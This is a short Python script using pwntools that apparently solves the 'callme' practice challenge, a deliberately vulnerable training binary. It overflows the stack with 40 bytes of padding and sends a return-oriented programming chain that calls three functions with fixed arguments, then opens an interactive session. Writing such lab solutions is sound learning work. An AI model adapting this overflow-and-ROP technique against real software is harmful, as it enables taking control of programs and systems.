from pwn import *

#declaring binaries, elf, libc
context.binary = binary = './callme'
elf = ELF(binary)
rop = ROP(elf)

#payload, symbols, rop chains,
#function arguments [0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d]

padding = b'A'*40
rop.call(elf.symbols.callme_one,	[0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d])

rop.call(elf.symbols.callme_two,	[0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d])

rop.call(elf.symbols.callme_three,	[0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d])

payload = flat(
	padding, rop.chain())

#sending payload, process interaction
io = process(binary)

io.sendlineafter(b'> ', payload)

io.interactive()
